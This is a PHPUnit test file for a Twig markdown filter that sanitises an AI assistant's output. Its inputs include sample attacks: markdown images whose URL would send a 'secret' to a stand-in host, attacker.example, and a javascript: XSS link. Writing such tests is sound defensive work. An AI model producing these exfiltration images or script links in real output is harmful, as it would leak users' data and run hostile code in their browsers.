<?php

declare(strict_types=1);

namespace App\Tests\Unit\Assistant\Infrastructure\Symfony\Twig;

use App\Assistant\Infrastructure\Symfony\Twig\AssistantMarkdownExtension;
use PHPUnit\Framework\TestCase;
use Twig\TwigFilter;

class AssistantMarkdownExtensionTest extends TestCase
{
    public function testAnImageIsRenderedAsItsAlternativeText(): void
    {
        $html = (new AssistantMarkdownExtension())->toHtml('Mira ![resumen](https://attacker.example/?d=secret)');

        $this->assertStringNotContainsString('<img', $html);
        $this->assertStringNotContainsString('attacker.example', $html);
        $this->assertStringContainsString('resumen', $html);
    }

    public function testAnImageWithoutAlternativeTextIsRenderedAsItsUrl(): void
    {
        $html = (new AssistantMarkdownExtension())->toHtml('![](https://attacker.example/?d=secret)');

        $this->assertStringNotContainsString('<img', $html);
        $this->assertStringContainsString('https://attacker.example/?d=secret', $html);
    }

    public function testAnExternalLinkOpensInANewWindowWithoutReferrer(): void
    {
        $html = (new AssistantMarkdownExtension())->toHtml('[Web](https://example.com/page)');

        $this->assertStringContainsString('href="https://example.com/page"', $html);
        $this->assertStringContainsString('rel="nofollow noopener noreferrer"', $html);
        $this->assertStringContainsString('target="_blank"', $html);
    }

    public function testARelativeLinkIsNotMarkedAsExternal(): void
    {
        $html = (new AssistantMarkdownExtension())->toHtml('[Tarea](/es/admin/tasks/1)');

        $this->assertStringNotContainsString('target="_blank"', $html);
    }

    public function testItEscapesEmbeddedHtmlAndUnsafeLinks(): void
    {
        $html = (new AssistantMarkdownExtension())->toHtml('<img src="https://attacker.example/x"> [click](javascript:alert(1))');

        $this->assertStringNotContainsString('<img', $html);
        $this->assertStringNotContainsString('href="javascript:', $html);
    }

    public function testItRegistersTheAssistantMarkdownFilter(): void
    {
        $names = array_map(static fn(TwigFilter $filter): string => $filter->getName(), (new AssistantMarkdownExtension())->getFilters());

        $this->assertSame(['assistant_markdown'], $names);
    }
}
